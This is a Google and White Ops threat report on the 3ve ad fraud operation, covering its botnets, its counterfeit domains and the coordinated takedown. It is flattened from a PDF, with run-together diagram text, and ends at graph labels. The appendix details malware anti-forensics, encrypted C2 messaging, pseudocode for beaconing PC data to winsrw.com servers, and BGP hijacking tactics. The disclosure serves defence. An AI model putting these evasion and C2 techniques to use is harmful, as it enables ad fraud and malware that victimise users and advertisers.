collaborationNovember 2018Co-authored by Google and White Opswith technical contributions by Proofpoint and others1Table of ContentsForeword Page 03 Acknowledgements Page 04 Context and background Page 05 A novel and innovative ad fraud threat Page 05 3ve in a nutshell Page 06 Operation summary Page 06 Discovery and history Page 07 A low-level botnet quickly evolves Page 07 Our knowledge and collaboration expanded Page 07 The 3ve operation Page 08 3ve.1 Page 11 3ve.2 Page 12 3ve.3 Page 13 Taking 3ve down Page 14 The industry working group Page 14 Indication of a successful takedown Page 14 Uniting the industry against future attacks Page 15 Appendix Page 17 3ve.1 Page 17 Operating as a proxy in user\u2019s PCs Page 17 Network communication Page 19 3ve.1 C2 handshake Page 20 BGP hijacking Page 21 3ve.2 Page 23 Counterfeit websites Page 23 Hidden Windows Page 27 Fake Browsing Behavior Page 27 Mouse movements Page 27 Patching functions Page 28 Playing media Page 29 Tag evasion Page 30 Non-counterfeit domains browsing Page 30 C2 Instructions Page 30 Parameters explained Page 33 Geographic distribution Page 34 Infected IPs and churn rate Page 35 3ve.3 Page 352Foreword ForewordEvery year brings new levels of sophistication and innovation in cybercrime, and the last year was no exception.Over the course of last year, we investigated one of the most complex and sophisticated ad fraud operations we have seen to date. We named this operation \u201c3ve\u201d (pronounced \u201cEve\u201d), and we\u2019re sharing what we\u2019ve learned from our investigation into its activity with the broader community to promote collaboration in the ongoing fight against cybercrime. These efforts demonstrate how effective cooperation and collaboration across the digital advertising industry can be in curbing ad fraud.3ve operated on a massive scale: at its peak, it controlled over 1 million IPs from both residential botnet infections and corporate IP spaces, primarily in North America and Europe (for comparison, this is more than the number of broadband subscriptions in Ireland). It featured several unique sub-operations, each of which constituted a sophisticated ad fraud scheme in its own right. Shortly after we began to identify the massive infrastructure (comprised of thousands of servers across many data centers) used to host 3ve\u2019s operation, we found similar activity happening within a network of malware-infected residential computers. These diversified tactics and siloed operations made 3ve\u2019s operators harder to identify than previous operations we\u2019d encountered, and also allowed the larger fraud enterprise to continue when one aspect of it was disrupted. Through its varied and complex machinery, 3ve generated billions of fraudulent ad bid requests (i.e., ad spaces on web pages that advertisers can bid to purchase in an automated way).3ve\u2019s size and tactics are considerable for an ad fraud operation, but the fact that fraudsters dedicate their time and effort to developing complex ad fraud schemes is hardly a surprise. Ad fraud has been an attractive cybercrime due to its lucrative returns and relatively low risk. The primary risk for most fraudsters has been having their operation discovered and shut down. While that can cost fraudsters thousands \u2013 and sometimes millions \u2013 of dollars in illicit profits, the prospect of purely financial losses has not effectively deterred fraudsters from simply starting another operation.Today marks the culmination of a collaborative effort that enabled us to more thoroughly confront and dismantle 3ve. We referred our findings to law enforcement, and today the U.S. Department of Justice announced criminal charges tied to 3ve\u2019s operations. What followed was a collaborative and coordinated effort by both law enforcement and various companies across industries, including ad tech, cyber security, and Internet service providers, to disable the infrastructure and sinkhole botnet command and control servers. The result so far has rendered the operation\u2019s botnets unable to continue to drive fraudulent ad traffic. Protecting the many targets \u2013 including our customers \u2013 of an operation like 3ve in the context of a multi-stakeholder working group required patience, dedication, diligence, and endurance. Our core objectives were to detect and prevent this fraud on behalf of our customers and Internet users, and to cut this operation off from its sources of profit.While ad fraud continues to represent a challenge to the advertising industry, the action taken today demonstrates that it is a risky activity with potentially serious consequences for fraudsters. And our efforts won\u2019t stop here \u2014 we\u2019re confident that the industry-wide movement to protect the integrity of the digital advertising economy will continue on.Tamer Hassan Co-Founder & CTO, White OpsPer Bjorke Senior Product Manager, Google3AcknowledgementsThis research was conducted by a team of dedicated security professionals. We would like to thank Kafeine from ProofPoint and the teams at ESET and Malwarebytes, as well as Matt Carothers, F-Secure, Symantec, and Trend Micro for their collaboration, contributions, and camaraderie in this effort.We would also like to thank all of the participants in the industry working group: Adobe, Amazon Advertising, CenturyLink, ESET, Facebook, Fox-IT, F-Secure, Matt Carothers, McAfee, Microsoft Digital Crimes Unit, Oath, Symantec, The Shadowserver Foundation, The Trade Desk, Trend Micro, and others. Last but not least, we would like to acknowledge and thank the broader members of our respective teams at Google and White Ops, as their work was critical every step along the way.Please note that we\u2019ve aimed to strike a balance in this document in terms of sharing technical information that has utility and excluding additional information that is too sensitive to share publicly. We encourage ad fraud researchers and other information security professionals to contact us at threatintel@whiteops.com for additional information that we may be able to disclose on a case-by-case basis.4Context and backgroundThe world of data science and cybersecurity is nothing like detective work in the movies. Usually, fraudulent activity is identified, traced to its source, and then cut off \u2014 and that\u2019s where the vast majority of cases end. Rarely does corporate ad fraud prevention lead to criminal charges, but that is exactly what happened with 3ve.are being seen by actual, interested users. These fraudsters attempt to extract small amounts of money from multiple parties and transactions with the goal of making the losses appear unconnected \u2014 if they\u2019re successful, in aggregate, these extracted amounts can add up to considerable profits for the fraudsters.3ve first emerged as a small bot-driven effort that subsequently grew into a large and sophisticated operation. As we investigated and battled against it, we began to better understand the operation and its aggressive evolution \u2014 and realized there were several operations with some common characteristics. Through our fight, we found ourselves on a path of discovery, exploration, and what some might describe as adventure.Because operations like 3ve bring distrust and instability to the digital advertising ecosystem, we were as thorough as possible in our efforts to bring it down. In the twists and turns that followed, we learned valuable lessons about the tactics and approaches fraudsters try to use to escape the notice of both their victims and those trying to uncover their operations, and the signals that will tip us off to similar operations in the future.Today, digital advertising is primarily bought and sold through \u201cprogrammatic\u201d platforms. Publishers agree to feature ads alongside their content and use Supply Side Platforms (SSPs) to auction their available ad space, or inventory, to advertisers. Advertisers use Demand Side Platforms (DSPs) to bid on that available ad space based on how successful they think those ads will be in generating the interest of visitors. These auctions happen billions of times a day, in the milliseconds before a page loads on your browser, and inventory can be passed between many auctions before being matched with an advertiser who wants to place their ad on your screen.The ability to sell and purchase digital advertising inventory programmatically has enabled publishers to maximize revenues and advertisers to realize a greater return on investment. Subsequently, programmatic advertising has rapidly evolved and grown into a multi-billion dollar industry, increasingly gaining prominence and visibility across the digital advertising ecosystem. Unfortunately, this increased prominence has also attracted the attention of tech-savvy fraudsters, who try to produce fake traffic and fraudulent ad inventory to trick advertisers into believing that their adsA novel and innovative ad fraud threat3ve was typical of many ad fraud operations in that it generated revenue by selling forgeries of two major assets in high demand from advertisers: human audiences and premium publisher inventory. But because 3ve was uniquely effective at counterfeiting the domains of prestigious publishers and sending droves of bots to false inventory, it was able to generate a substantial volume of fake ad bid requests. 3ve also operated at a high level of sophistication that appeared to be a series of unrelated operations. Its operators constantly adopted new ways to disguise 3ve\u2019s bots, allowing the operation to continue growing even after their traffic was blacklisted. Whenever they were blocked off in one place, they\u2019d reappear somewhere else.3ve was typical of many ad fraud operations in that it generated revenue by selling forgeries of two major assets in high demand from advertisers: human audiences and premium publisher inventory.5To protect itself against ad fraud, the industry relies on third party verification solutions like White Ops and in-house defenses like those implemented by Google. Collectively, our teams have seen a wide range of botnet schemes, ad fraud tactics, and invalid activity.This knowledge and expertise helped us perform a deeper investigation into 3ve, connect all of its disparate sub-operations and components to a larger infrastructure, and reveal how sophisticated and well-organized these operation were.3ve in a nutshellOperation summary3b+1m700kDaily bid requestsCompromised IPsActive infections at a time60k+10k+1k+Accounts selling ad inventoryWebsites counterfeitedData center nodesPeak metrics, including ad traffic volumes and other volumes observed over the course of 3ve\u2019s investigation.Advanced techniques used to avoid detectionMimicking human behaviors including mouse movements, faked clicks, etc.Tag evasionAbility to quickly regenerate residential IP addressesMalware anti-forensicsNo single point of failure (e.g., fixed IP list)3ve used a variety of techniques that made it more difficult to identify and analyze.6Discovery and historyA low-level botnet quickly evolvesWe first noticed the beginnings of what would later become 3ve while our two companies were assessing the impact of the Methbot operation, a similar underground ad fraud enterprise that White Ops revealed in 2016. At this early stage of 3ve\u2019s growth, it appeared to be a low-volume bot operation conducting ad fraud through residential computers infected with an unknown malware. Far from being groundbreaking, it looked like a run-of-the-mill malicious bot with minimal impact on the industry at large.We estimate that 3ve generated between 3 billion and 12 billion or more daily ad bid requests at its peak.But 3ve\u2019s activity grew in 2017, with its operation eventually generating billions of daily ad bid requests. That spike in activity prompted our two companies to begin collaborating in investigating the malware being used by this newly prominent fraud enterprise. We estimate that 3ve generated between 3 billion and 12 billion or more daily ad bid requests at its peak.The lower bound (3 billion) is a conservative estimate based on how many ad bid requests a single buying platform may have received. This approach may underestimate the total volume of ad bid requests generated by 3ve, because each individual buying platform may not have received all ad bid requests (e.g. one DSP may not have had a business relationship with all available supply partners or a DSP may only have received portions of available inventory from some supply partners). When measuring 3ve\u2019s ad bid volume across the supply chain (and not only within a single buying platform) we estimate that the ad bid volume exceeded 12 billion daily ad bid requests. It should be noted that our analysis of ad bid requests indicated growth in activity, but not necessarily growth in transactions that would result in charges to advertisers. It is also worthnoting that 3-12 billion is a small percentage of overall bid request volume across the industryOur knowledge and collaboration expandedAlthough we were able to identify the traffic from the operation, our visibility into its full capabilities was limited until we discovered malware samples that matched what we\u2019d seen from 3ve\u2019s bots. This led us to two malware families: Boaxxe/Miuref and Kovter.We started referring to the bot operation as 3ve because our analysis suggested that it was composed of three distinct sub-operations, all of which shared certain similarities, but which were specifically designed to commit different kinds of ad fraud.We gathered malware samples from fellow fraud researchers at Proofpoint and Malwarebytes, but each time we tried to run them on our own computers, they wouldn\u2019t work. After some deep collaboration with ProofPoint and Malwarebytes, we discovered that this was because the malware was using anti-forensics, an evasion tactic in which malware scans a computer\u2019s processes, hardware, username, and IP address for any security software that might detect it before running on that computer. The malware was also only receiving and executing ad fraud instructions on computers with certain ISPs and in specific geographical locations. Subsequently, we were able to observe and gradually understand 3ve\u2019s inner workings. That process progressively revealed the presence of more malware and botnet families being used by 3ve.We started referring to the bot operation as 3ve because our analysis suggested that it was composed of three distinct sub-operations, all of which shared certain similarities, but were specifically designed to commit different kinds of ad fraud. We observed the network using tactics like7tag manipulation and suppression to cover its tracks, and noticed that it had started to quickly change its codebase after each spike in its activity.We had to ensure that the operators thought they were going unnoticed in order to observe them and apply our learnings to future security efforts.acquire new IP addresses, we realized that a blacklist would only temporarily interrupt 3ve\u2019s activity. To take it down permanently, we needed to understand how 3ve was structured and organized, we had to ensure that the operators thought they were going unnoticed in order to observe them and apply our learnings to future security efforts, and we needed to expand our effort beyond Google and White Ops.The actors responsible for the three sub-operations of 3ve demonstrated a high level of sophistication, creativity, and agility. In response, we needed to figure out a way to permanently disable it or shut it down.One way to bring down bot operations is to blacklist all of their known IP addresses. However, because of the operation\u2019s aggressiveness, as well as its ability to rapidlyAs 3ve\u2019s perpetrators were building the infrastructure behind their operations, we secretly started building a coalition of partners working to stop them. Over the following weeks and months, White Ops, Google, and various other industry participants together to dismantle 3ve.The 3ve operationA typical ad fraud operation tries to keep its profit model simple, targeting only one aspect of the digital advertising ecosystem. For example, fraudsters will commonly create and sell bot traffic to unsuspecting publishers looking to get more eyes on their content. At least two of the three 3ve sub-operations used such tactics and also added another common approach: selling counterfeit ad inventory featuring the domains of popular websites \u201cspoofed\u201d by 3ve\u2019s operators. Domain spoofing is designed to fool advertisers into thinking that an impression of their ad was served on a premium publisher site, like that of a noteworthy newspaper (and not on an empty website designed for bot traffic).Closed Captioning American Sis - Sibling Rivalry - FilmPhile\u2022 Watch More Funny Movies on FilmPhile \u2022 Watch Live TV on FilmPhile \u2022 Watch This Season\u2019s Comedy on FilmPhile \u2022 Here\u2019s What Happened on American Sis - The Secret Society of Super Sisters - FilmPhile \u2022 HelpTurned - All Is Not Gone - FIlmPhile CD League - Semifinals/Grand Final - FilmPhile SearchAn example counterfeit site shows a low-quality web page with a video ad and links below.8But this describes only the basic premise behind what is actually a set of three distinct sub-operations, each taking unique measures to avoid detection, and each built around different architectures using different components. Like a fully professional software company, 3ve\u2019s operators had the ability to A/B test different approaches, as well as different parts of the bot operation, in order to insulate themselves from the fallout if one part was somehow cut off or shut down. Although the degree of complexity varied among the three sub-operations, all three demonstrated highly advanced behaviors, including the impersonation of real human users, tag evasion, and sophisticated malware-based anti-forensics.Overall 3ve operations3ve.13ve.23ve.3General DescriptionData center based bot with botnet and hijacked IPsBotnet based counterfeit ad fraudData center botMostly counterfeit with fake pages and apps hosted in data centers. Indication of some traffic selling.Mostly counterfeit inventory with fake pages hosted in data centers. Indication of some traffic selling.Indications of traffic selling, and unable to determine if they also create counterfeit inventory.The residential IPs of botnet infected computers or from BGP hijacked IPsThe residential IPs of botnet infected computersData center IPsMonetizationApproachAd Request IP Address9When combined, the three 3ve sub-operations constituted one of the most widespread ad fraud operations ever uncovered. One of the three sub-operations included one of the larger active botnets, with up to 700,000 active desktop infections at any given time. One of the other 3ve sub-operations was by itself similar in size and scope to the Methbot operation of 2016, which was likely the largest known ad fraud operation at that time.All told, 3ve controlled over 1 million IPs from both residential botnet infections and corporate IP spaces (as noted above, there were up to 700,000 active infections at any given time). In aggregate, the operation also produced more than 10,000 counterfeit domains, and generated over 3 billion daily bid requests at its peak. We estimate that portions of the bot operation spanned over 1,000 servers in data centers allocated to various functions needed for this type of large-scale operation.Despite 3ve\u2019s scale and aggressive growth, we worked proactively to deploy countermeasures in order to protect customers and to diminish the chances that 3ve\u2019s operators could benefit from their activities. Our collective experience in combating ad fraud enabled us to establish a variety of defenses against 3ve, while we worked in parallel to dismantle it.The sections below provide a brief overview of all three 3ve operations (called 3ve.1, 3ve.2, and 3ve.3 for the sake of clarity), breaking down how each was structured to circumvent bot detection and blocking measures in order to siphon as much ad budget as possible. Expanded details and context for the sub-operations are included in the Appendix.Real Human TrafficProgammatic Supply ChainAd Networks Sell ad space toDemand Side Platforms and directly to advertisers.AdvertisersWin auctions to deliverads on webpages.01 01 01Everyday PeopleCreate real ad space by visiting real web pages.Fake or Non-Human Traffic1,000+Ad Fraud Operator Uploads instructionsto 3ve botnets.3ve BotnetsOpen thousands of webbrowsers, disguise traffic, and visit fake and real web pages.Real and fake web pagescreate ad space thatis sold in programmaticsupply chain.Supply Side PlatformsSell ad space toDemand Side Platformsin real time.Demand Side Platforms Submit bids on behalfof advertisers to purchase ad space.An overview of the broader 3ve operation103ve.1The first of 3ve\u2019s three ad fraud sub-operations, 3ve.1, was powered by a network of bots all operating in a few data centers across the US and Europe. Normally, bot operations like these are very easy to detect \u2014 if you see a lot of traffic for an ad coming from the same IP address, you know you\u2019re dealing with a bot farm. But this operation cleverly used compromised IP addresses as a proxy, making it seem as though its ad requests were coming from computers in homes and businesses in sought-after markets. While many of these IP addresses were acquired via a malware called Miuref or Boaxxe, others were obtained using a procedure called Border Gateway Protocol (BGP) hijacking. The hackers essentially seized huge swaths of corporate and residential IP space by interfering directly with the main Internet routing protocol.All the fake ad requests from 3ve.1 initially pretended to be from desktop browsers, but this changed over time, with the operation increasingly relying on spoofed mobile traffic. This was done by the data center-based browsers pretending to be Android devices. There were two unique, active mobile misrepresentation schemes: in one the ad requests were spoofed to look like they came from mobile apps, in the other the ad requests were spoofed to look like they came from mobile browsers. The spoofing was achieved by overriding the parameters typically used to determine what type of device the traffic came from.1,000+Ad fraud operator writes instructions and uploads it to their data center botnet.The data center computersopen thousands of web browsers and contact acommand and control relay.The command and control relays direct the data center browsersto proxy their traffic throughinfected devices or hijacked IPs and visit fake and real web pages.Those fake web pages generate ad requests to receive ads from the programmatic supply chain.3ve.1 architecture113ve.2Comparable to 3ve.1, 3ve.2 also used counterfeit domains to sell fake ad inventory to advertisers. But instead of relying on proxies to hide its activities, 3ve.2 used a custom-built browsing engine installed with the Kovter botnet, which had infected hundreds of thousands of computers through malvertising campaigns (malvertising is the use of digital ads to distribute malware). This operation had similarities with 3ve.1 (although 3ve.2 was superior in its level of sophistication) that initially led us to believe they might be variants of each other, but later research suggested they were distinct, but connected sub-operations. Recent evaluations of the Kovter botnet have put it at approximately 700,000 user computers and IP addresses. 3ve.2 made use of redirection servers that instructed the infected computers to visit specific fake web pages.Fraud Operator sends instructions to commandand control server.Kovter infected computersreceive instructions from command andcontrol server.Infected computer opens hidden browsers and visitsa fake web page (via a redirect server).Web pages generate ad requests to receive ads from the programmaticsupply chain.3ve.2 architecture123ve.3The third 3ve-associated sub-operation was similar to the others in that it registered its ad fraud bot networks under different IP addresses in order to hide their activity. Like 3ve.1, 3ve.3\u2019s bots were based in a few data centers, but it used the IP addresses of other data centers instead of residential computers to cover its tracks. Again, data centers are far more suspicious to advertisers worried about bot traffic, but 3ve.3\u2019s strategy still allowed its operators a good degree of agility by allowing them to find new data centers as soon as old data centers were blocked. Although easier to detect, this approach allowed them to commit ad fraud more efficiently \u2014 data centers can offer greater bandwidth than hundreds of thousands of residential computers.1,000+Ad Fraud operator writes instructions and uploads it to their data center botnet.The data center computersopen thousands of web browsers and contact acommand and control relay.The command and control relays direct the data center browsers to proxy their traffic through data center IPs and visit fake and realweb pages.Those fake web pages generate ad requests toreceive ads from the programmaticsupply chain.3ve.3 architecture13Taking 3ve downWith each detail we uncovered about 3ve and its inner workings, it became clearer that a typical blacklisting effort would only cause portions of the operation to momentarily go offline, giving 3ve\u2019s operators a chance to reset a short time later.3ve\u2019s sheer size and complexity posed a significant risk not just to individual advertisers and publishers, but to the entire advertising ecosystem. We had to shut the operation down for good, which called for greater, more calculated measures. To that end, it was critical that we played the long game, endeavoring to have a more permanent, more powerful impact against this and future ad fraud operations.To dismantle 3ve and prevent its return, collaboration was needed from major partners across the digital media space, from web publishers to anti-virus companies. Although a technical takedown was necessary, historically technical measures alone have not always been sufficient to prevent a recurrence in the past. A takedown combined with prosecution would more fully disrupt the criminal organization and serve as a deterrent to similar activity by other actors. Taking this approach meant spending time collectively researching and investigating the operation, allowing us to map out its infrastructure, its monetization strategy, and its major components.The industry working groupIt was this conclusion that prompted the creation of the industry working group, which included a variety of stakeholders including White Ops, Google, 15 other major industry parties, and members of the information security community. This working group used the diverse expertise of its various partners to analyze and understand 3ve.One of the working group\u2019s main goals was collaborative intelligence. The working group spent months observing 3ve\u2019s activities, working to build an invaluable technical approach to identifying and defending against similar threats in the future.The working group spent months observing 3ve\u2019s activities, working to build an invaluable technical approach to identifying and defending against similar threats in the future.The success of the working group can largely be credited to the wide range of perspectives and skill sets represented by its participants. The diverse vantage points and indispensable insights of key ad tech companies and several ISPs were instrumental in understanding 3ve\u2019s impact, while anti-virus specialists worked to understand the malware that was written and installed onto residential computers as a way to provide cover for the botnet\u2019s data centers.Our investigation and analysis of 3ve was expedited by this cross-functional collaboration with industry partners.Indication of a successful takedownA coordinated takedown of infrastructure related to 3ve\u2019s operations occurred recently. The takedown involved disrupting as much of the related infrastructure as possible to make it hard to rebuild any of 3ve\u2019s operations. Technical takedowns like these require detailed understanding of the internal aspects of the fraud operations and extensive collaboration across many companies from various parts of the industry. As the graph below demonstrates, declining volumes in invalid traffic indicate that the disruption of infrastructure thus far has been successful, bringing the bid request traffic close to zero within 18 hours of starting the coordinated takedown. Our sincere gratitude and appreciation to everyone involved with this takedown effort.14s Bi12:00 AM12:00 PM12:00 AM12:00 PM12:00 AM12:00 PMTimeIncoming 3ve.2 bid requests (via OpenRTB protocol)Uniting the industry against future attacksWhenever a major ad fraud operation like this is uncovered, it serves as a wake-up call to those involved in digital advertising. Not only is it necessary to reinforce traditional guards against ad fraud, but three critical tactics need to be adopted to account for the rapidly evolving capabilities of automated threats like 3ve.1. Create and adopt industry standards like ads.txt \u2014 The industry is working on new tools to protect itself from adfraud. Ads.txt was created by the IAB Tech Lab to help prevent domain spoofing by allowing publishers to create public files of \u201cAuthorized Digital Sellers.\u201d These files make it easy to see which parties are authorized to sell that publisher\u2019s ad inventory. Adoption of ads.txt has been very strong: to date over 500,000 domains have published ads.txt files. As more sell- and buy-side platforms continue to roll out their enforcement and advertisers opt to only buy inventory from domains with ads.txt files, the potential for fraudsters to profit from selling counterfeit inventory will be minimized.2. Be mindful and proactive about ad fraud \u2014 There are a number of heuristics that advertisers can use to ensure that whatever ad fraud solution they have in place is working. One good rule of thumb: if it seems too good to be true, it probably is. That means if you start implementing an anti-fraud solution that decreases your fraud rate, but doesn\u2019t cause your CTR to drop with it, it\u2019s likely that your solution isn\u2019t quite working correctly. Similarly, your ad fraud rate should be changing over time, as there is inherent variability in traffic volumes.3. Use a layered methodology for fighting ad fraud \u2014 Much of our experience with 3ve demonstrates just how good bots have become at imitating human users. Advertisers and publishers should therefore take a layered approach to bot traffic and ad fraud detection, using both in-house defenses and third-party verification to look for all the indicators of bot-controlled computers.15To give a concrete example of the value of industry collaboration, consider the ads.txt status for 3ve\u2019s traffic. As shown in the graph below, more than 80% of the incoming ad bid requests that 3ve generated in early 2018 were unauthorized (\u2018unauthorized\u2019 in this context means that the bid requests were offered for sale by sellers that were not listed as authorized sellers in a domain\u2019s ads.txt file) . If all ad tech companies and advertisers enforced ads.txt and stopped buying or selling unauthorized inventory, over 80% of all 3ve inventory would be completely blocked across the entire industry ads.txt status for 3ve traffic8.6% Authorized (Direct)11% Authorized (Indirect)80.3% Unauthorizedads.txt status for recent 3ve traffic3ve\u2019s takedown represents two important milestones for the digital advertising industry: First, it demonstrates the power of industry collaboration in confronting sophisticated ad fraud operations. Second, that law enforcement action sends a clear message that committing ad fraud can have significant consequences, which is likely to discourage would-be cybercriminals.Curtailing ad fraud is not only good for the digital advertising ecosystem, but also the billions of people who rely on the Internet to be a safe place where they can access services and information that add value to their lives. We believe that both the intelligence we\u2019ve gained from 3ve, and subsequent law enforcement action, should make it riskier and harder for similar operations to profit in the future.16AppendixWe\u2019ve included the sections below to expand on the details and context provided for 3ve\u2019s three sub-operations in the main body of this document.3ve.1Operating as a proxy in user\u2019s PCsWhenever the 3ve.1 binary was executed, it would start collecting specific information about the PC on which it was running. Among other things, the binary would read the Computer Name, Volume Serial Number, Machine GUID, the full path of the running process (in this case, c:\\test\\ eve.exe), and time zone. Then, it would build a hash table of known programs that are typically used by analysts. Finally, it used the typical CreateToolhelp32Snapshot/ Process32NextW to enumerate all running processes and cross-reference them with the hash table.3ve.1\u2019s binary did the same thing with device drivers, checking for the presence of VMs, remote access software (LogMeIn), CD-ROM type, etc. If anything went wrong, it would sleep forever without executing any fraud-like requests. While running all these checks, it would also copy itself to other locations and drop a new binary file into C:\\Users\\ \\AppData\\Local\\ VirtualStore\\lsass.aaa.All this information would be appended to a big string, which was RSA-encrypted (with a hard-coded key) and sent to the server. To be clear, the first message included both the user info and the RC4 key, and was encrypted with an RSA public key. If the C2 confirmed that it was safe to start executing commands, the following messages would be quickly encrypted with RC4 using the previously generated RC4 key.The first of 3ve\u2019s three ad fraud sub-operations, 3ve.1, was a hybrid operation, and was itself composed of three main layers: an army of bots in multiple European data centers, a layer of exit nodes (the IP addresses that the ad requests appear to originate from) comprised of malware-infected user computers or stolen corporate IP space, and a command and control (C2) layer that directed the malware and ad fraud bots on every transaction. This sub-operation was primarily focused on video fraud, selling counterfeit video inventory to advertisers on counterfeited domains.This layered architecture allowed the operators to keep their bot software isolated, proxying all activity through both infected user computers and through IP space stolen from corporations via Border Gateway Protocol (BGP) hijacks. Acquiring IP addresses this way is significant because it constitutes a particularly blatant form of fraud, used to corrupt large groups of IPs by interfering directly with an exterior routing protocol. If one of these stolen IP addresses was detected as the source of fraudulent activity, it was easily burned and recycled, while the same bots continued running in the data centers behind it. The operation\u2019s ability to continuously find new IPs through which to proxy gave it a layer of protection and isolation, avoiding any \u201csingle point of failure\u201d that could allow us to easily eradicate it.The ad fraud bot operation was comprised of Miuref/Boaxxe infected-computers. This bot farm largely relied on Chrome and Internet Explorer. While the number of IPs hijacked from corporations ranged from 200,000 to 500,000 at any given time, the malware infection footprint appears to have remained at less than 5,000 infections across the globe.17pn:C:\\Test\\eve.exe un:davidcopperfield cn:DESKTOP-1Z8V3O1 cpu:1,1,Intel(R) Core(TM) i7-6600U CPU @ 2.60GHz sk: uwomanrx (RC4 Key used for future communication)Message sent and encrypted for 3ve.1 to start executing commands.Before encryption\u2193 FRO ------- u : x x x x x x x x x 6 4 a 7 2 2 0 5 4 c 8 c 2 8 8 8 e f 9 3 b b \u25d9o : 6 . 2 . 9 2 0 0 \u25d9b : 6 4 \u25d9a : 0 \u25d9c : 1 \u25d9v: 1 0 0 \u25d9s : 0 \u25d9r : 1 \u25d91 : 2 0 0 0 \u25d9 d : 1 2 \u25d9n : 5 \u25d9c p : 1 0 \u25d9c r : f 0 5 4 6 e 2 8 \u25d9b t : 1 d 2 2 5 e c . f 1 c 7 f a 1 0 \u25d9p n : C : \\ T e s t \\ e v e . e x e \u25d9u n : m X X X X X a c o c n : D E S K T O P - 1 X X X X 0 1 \u25d9c p u : 1 , 1 , I n t e l ( R ) Core (TM) i7-66 z\u25d9\u00bd\u00bd\u00bd\u00bd\u00bd\u00bd\u00bd\u00bdAfter encryption and encoding\u2193 FRO ------- N E p 9 3 E 3 S h q S V b I k H % 2 b g C Q t n G 8 K 4 8 b J w K 0 g Q T l g f 2 G m 6 V u q N 5 O E k 4 4 M q J 5 L F u x k s 6 m i r o c I Q p h D 9 9 8 V p W H u 8 H W 1 C 5 3 y M 2 O 1 O o R m w t 3 6 G i 7 h q Z e 3 Y F b I v u X J W o r s W o y F % 2 f u U u s 7 D c n J N a s Y 1 S k v 8 B n B u f p h v W 1 c O O K v 8 m W d V L G Y 6 Q 0 z 7 3 f h W z i 4 4 r K y J I d x d d a k d A h i W U % 2 b v E m j e r y z Y L V O L i J A 0 3 % 2 f k J G N 5 1 G v B D T r n 0 4 MYnpx4rxLpXkw9nb3ve.1 messages before and after encryption and encoding.18Network communication3ve.1 used three different sets of APIs to communicate with its C2 servers. The first request was done by instantiating an Internet.Explorer COM Application and using its Navigate2 method to generate a GET request eax, [edp+ppv] offest rclsid_Internet_Explorer ; rclsid dword ptr [ecx+OD Oh] ; iexplore.Navigate2 esi, ds:GetTickCount esi ; GeTickCount [edp+psz], eax; ppv ; pUnkOuterCoCreateInstance that instantiated the Internet.Explorer CLSID and spawn a windowless iexplore.exe process.The above CoCreateInstance would instantiate the Internet.Explorer CLSID {0002DF01-0000-0000-C000- 000000000046}, spawning a windowless iexplore.exe process, then would use its Navigate2 method to send the encrypted PC data to their C2 server.We were able to easily pinpoint the instantiated COM by searching the CLSID in the registry. The search returned quickly, showing us that it belonged to Internet Explorer.Internet.Explorer.Application Registry KeyInstantiated COM registry location within Internet Explorer19Right after the Navigate2, 3ve.1 used the Wininet API [ InternetConnectA / HttpSendRequestA ] to do the same request from its own process. However, at this stage, it would set different flags using the InternetSetOptionA \u2014 this was probably a measure used to bypass the local proxy. All these wininet calls were not visible in the PE import table because they were loaded at runtime via kernel32.dll LoadLibrary/GetProcAddress.The communication from this point on would be channeled exclusively through the low-level Windows Sockets 2 API. This both gave 3ve.1\u2019s operators more control and bypassed the local proxy.3ve.1 C2 handshakeThe binary had several hard-coded (but encrypted) hostnames inside. For example, there was an array of servers named [d].winsrw.com where the first digit would change from 1 to 5. Once the malware was sure it had Internet access (by sending a couple of requests to microsoft.com), it would get the IPs of those servers using the gethostbyname function. Finally, it would connect to them using the Windows socket API.Then, 3ve.1 would send the same user/PC information to one of the winsrw.com servers, expecting to receive an \u201cOK.\u201d But the server is pretty selective, and checks several things before accepting: for example, Windows language/locale information should be English, and the IP must be in the US range.The pseudocode below describes better how this works \u2014 just keep in mind that both the request and response are always encrypted.Client (Malware)Socket->Connect(Get_IP(2.winsrw.com)) Repeat Every 30\u201dSocket->Send(PC_INFO) If (Response == \u201cOK\u201d)Start_Ad_Fraud (and stop checking every 30\u201d)Server (C2 from *.winsrw.com)If (PC_INFO == REAL_PC AND IP_LOCATION == US) Response->MORE_COMMANDSNO_REPLYPseudocode describing 3ve.1\u2019s C2 handshakeAs described above, the C2 replies back an OK if the user information matches what they consider a valid PC and if the IP is in the US.20BGP hijackingThe Internet is composed of many independent networks (referred to as \u201cAutonomous Systems,\u201d or ASs, each assigned a unique identifier called an ASN), all tied together via something called \u201cBorder Gateway Protocol\u201d or (BGP). Through BGP, these networks are able to build a globally shared \u201crouting table\u201d that allows them to easily determine how any one IP address can connect to any other. The problem is that BGP was designed during a more innocent time for the Internet, when it was small and everybody trusted each other. While some improvements to security have been made over the years, it still primarily relies on trust \u2014 and the implied threat of being cut off if one misbehaves. But people who attempt to game this system won\u2019t be cut off if no one notices or cares about their misconduct, and there are still a lot of unused and forgotten IP addresses out there that criminals might use to mask unscrupulous activity. This presents an opportunity for bad actors to do something known as \u201cBGP hijacking.\u201d One group of such actors came to our attention in early 2017.The BGP hijacking operation used by 3ve had been set up long before we started seeing it used for fraud on a non-trivial scale. Historical routing data shows the core AS \u201cALPHA\u201d used in the beginning of the operation came online in 2013, while the low-volume, low-sophistication bot activity White Ops has seen only dates back to 2015. The routing setup was simple: just the core ALPHA AS and a few directly attached networks, connected via a single transit provider. We are uncertain whether the IP space they were using was legitimately obtained or not, but the goal of phase 1 seems to have been to establish some history for ALPHA before it started doing shady things.IPsIPsIPsIPsIPsIPsDefunct ASN 1Defunct ASN 2ASN AlphaTransitDefunct ASN 3Initial 3ve.1 BGP hijacking operation structureIn early March of 2017, ALPHA began to abuse its position of trust within BGP. They chose defunct ASs that had been inactive for quite some time and set them up behind their own AS. IP addresses were required to make this useful, so they found some IP networks that weren\u2019t being used and began advertising them from the defunct (now zombie) ASs.ALPHA was very careful about which entities it decided to impersonate \u2014 many still had functional (though badly out of date) websites. In many cases, ALPHA chose ASs formerly used by Internet service or hosting providers, along with IPs used by companies that were from the same geographic region.The next stage of evolution came in late August. AS BRAVO came online (also in Eastern Europe), which had several transit providers, including the one serving AS ALPHA, connecting it to the Internet. This made it more resilient in case any of its transit providers were to bring down the hammer on its illegal activities. AS BRAVO used an even more complicated network setup \u2014 it had several defunct ASs attached to it, each of which in turn had several more defunct ASs attached through which to actually route IP addresses. This configuration made it look more like a legitimate network, and also increased the rate of \u201cchurn\u201d of ASs and IPs so that it could respond to blocks faster. Use of AS ALPHA was slowly phased out as AS BRAVO ramped up.2120,000,00015,000,00010,000,000500,00004/1/20177/1/201710/1/20171/1/2018Current IPsCumulative 